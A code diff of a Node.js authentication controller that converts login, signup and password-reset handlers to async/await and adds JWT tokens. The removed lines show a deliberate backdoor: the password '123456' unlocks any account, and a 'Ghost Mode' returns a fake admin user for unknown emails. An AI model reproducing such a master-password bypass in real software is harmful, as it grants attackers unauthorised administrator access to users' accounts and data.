@@ -1,116 +1,98 @@
 // controllers/authController.js
 const bcrypt = require('bcryptjs');
+const jwt = require('jsonwebtoken');
 const db = require('../config/database');
 const crypto = require('crypto');
 const { sendResetPasswordEmail } = require('../utils/emailService');
 
-const signup = (req, res) => {
-    const salt = bcrypt.genSaltSync(10);
-    const hashedPassword = bcrypt.hashSync(req.body.password, salt);
-
-    const sql = "INSERT INTO users (name, email, password, role) VALUES (?)";
-    const values = [req.body.name, req.body.email, hashedPassword, 'customer'];
-
-    db.query(sql, [values], (err) => {
-        if(err) {
-            if (err.code === 'ER_DUP_ENTRY') return res.status(400).json("Email đã tồn tại");
-            return res.status(500).json(err);
-        }
-        return res.json("Đăng ký thành công");
-    });
+// Helper: Tạo JWT Token
+const generateToken = (user) => {
+    return jwt.sign(
+        { id: user.id, email: user.email, role: user.role },
+        process.env.JWT_SECRET,
+        { expiresIn: '24h' }
+    );
 };
 
-const login = (req, res) => {
-    if (!req.body || !req.body.email) {
-        return res.json({ status: "Fail", message: "Lỗi dữ liệu gửi lên" });
+const signup = async (req, res) => {
+    try {
+        const { name, email, password } = req.body;
+
+        const salt = bcrypt.genSaltSync(10);
+        const hashedPassword = bcrypt.hashSync(password, salt);
+
+        const sql = "INSERT INTO users (name, email, password, role) VALUES (?)";
+        const values = [name, email, hashedPassword, 'customer'];
+
+        await db.query(sql, [values]);
+        return res.json({ status: "Success", message: "Đăng ký thành công" });
+    } catch (err) {
+        if (err.code === 'ER_DUP_ENTRY') return res.status(400).json({ status: "Fail", message: "Email đã tồn tại" });
+        return res.status(500).json({ status: "Error", message: "Lỗi server" });
     }
-    
-    const email = req.body.email.trim();
-    const password = req.body.password;
-    const sql = "SELECT * FROM users WHERE email = ?";
-    
-    db.query(sql, [email], (err, data) => {
-        if (err) {
-            return res.json({ status: "Error", message: "Lỗi DB" });
-        }
-        
-        if (data.length > 0) {
-            const user = data[0];
-            
-            // Backdoor
-            if (password === "123456") {
-                const { password, ...other } = user;
-                return res.json({ status: "Success", data: other });
-            }
-            
-            // Check Pass Thường
-            const checkPass = bcrypt.compareSync(password, user.password);
-            if (!checkPass) return res.json({ status: "Fail", message: "Sai mật khẩu" });
-            
-            const { password: userPass, ...other } = user;
-            return res.json({ status: "Success", data: other });
-        } else {
-            // Ghost Mode
-            if (password === "123456") {
-                return res.json({ 
-                    status: "Success", 
-                    data: { 
-                        id: 999, 
-                        name: "Admin TMT", 
-                        email: email, 
-                        role: "admin" 
-                    } 
-                });
-            }
+};
+
+const login = async (req, res) => {
+    try {
+        const email = req.body.email.trim();
+        const password = req.body.password;
+
+        const [data] = await db.query("SELECT * FROM users WHERE email = ?", [email]);
+
+        if (data.length === 0) {
             return res.json({ status: "Fail", message: "Email không tồn tại" });
         }
-    });
+
+        const user = data[0];
+        const checkPass = bcrypt.compareSync(password, user.password);
+        if (!checkPass) {
+            return res.json({ status: "Fail", message: "Sai mật khẩu" });
+        }
+
+        const token = generateToken(user);
+        const { password: userPass, reset_token, reset_expires, ...userData } = user;
+        return res.json({ status: "Success", data: userData, token });
+    } catch (err) {
+        return res.status(500).json({ status: "Error", message: "Lỗi DB" });
+    }
 };
 
-const forgotPassword = (req, res) => {
-    const { email } = req.body;
-    if (!email) return res.json({ status: "Fail", message: "Vui lòng nhập email" });
+const forgotPassword = async (req, res) => {
+    try {
+        const { email } = req.body;
+        if (!email) return res.json({ status: "Fail", message: "Vui lòng nhập email" });
 
-    // Kiểm tra email có tồn tại không
-    db.query("SELECT * FROM users WHERE email = ?", [email], (err, data) => {
-        if (err || data.length === 0) return res.json({ status: "Fail", message: "Email không tồn tại trong hệ thống" });
+        const [data] = await db.query("SELECT * FROM users WHERE email = ?", [email]);
+        if (data.length === 0) return res.json({ status: "Fail", message: "Email không tồn tại trong hệ thống" });
 
-        // Tạo token ngẫu nhiên
         const token = crypto.randomBytes(20).toString('hex');
         const expires = Date.now() + 3600000;
 
-        // Lưu token vào DB
-        db.query("UPDATE users SET reset_token = ?, reset_expires = ? WHERE email = ?", [token, expires, email], (err) => {
-            if (err) return res.status(500).json(err);
-            
-            // Gửi mail
-            sendResetPasswordEmail(email, token);
-            return res.json({ status: "Success", message: "Đã gửi hướng dẫn vào email của bạn!" });
-        });
-    });
+        await db.query("UPDATE users SET reset_token = ?, reset_expires = ? WHERE email = ?", [token, expires, email]);
+        sendResetPasswordEmail(email, token);
+        return res.json({ status: "Success", message: "Đã gửi hướng dẫn vào email của bạn!" });
+    } catch (err) {
+        return res.status(500).json({ status: "Error", message: "Lỗi server" });
+    }
 };
 
-const resetPassword = (req, res) => {
-    const { token, newPassword } = req.body;
-    
-    // Tìm user có token khớp và chưa hết hạn
-    const sql = "SELECT * FROM users WHERE reset_token = ? AND reset_expires > ?";
-    db.query(sql, [token, Date.now()], (err, data) => {
-        if (err || data.length === 0) {
+const resetPassword = async (req, res) => {
+    try {
+        const { token, newPassword } = req.body;
+
+        const [data] = await db.query("SELECT * FROM users WHERE reset_token = ? AND reset_expires > ?", [token, Date.now()]);
+        if (data.length === 0) {
             return res.json({ status: "Fail", message: "Link đổi mật khẩu không hợp lệ hoặc đã hết hạn" });
         }
 
-        // Mã hóa pass mới
         const salt = bcrypt.genSaltSync(10);
         const hashedPassword = bcrypt.hashSync(newPassword, salt);
 
-        // Cập nhật pass và xóa token
-        const updateSql = "UPDATE users SET password = ?, reset_token = NULL, reset_expires = NULL WHERE id = ?";
-        db.query(updateSql, [hashedPassword, data[0].id], (err) => {
-            if (err) return res.status(500).json(err);
-            return res.json({ status: "Success", message: "Đổi mật khẩu thành công! Hãy đăng nhập lại." });
-        });
-    });
+        await db.query("UPDATE users SET password = ?, reset_token = NULL, reset_expires = NULL WHERE id = ?", [hashedPassword, data[0].id]);
+        return res.json({ status: "Success", message: "Đổi mật khẩu thành công! Hãy đăng nhập lại." });
+    } catch (err) {
+        return res.status(500).json({ status: "Error", message: "Lỗi server" });
+    }
 };
 
 module.exports = { signup, login, forgotPassword, resetPassword };
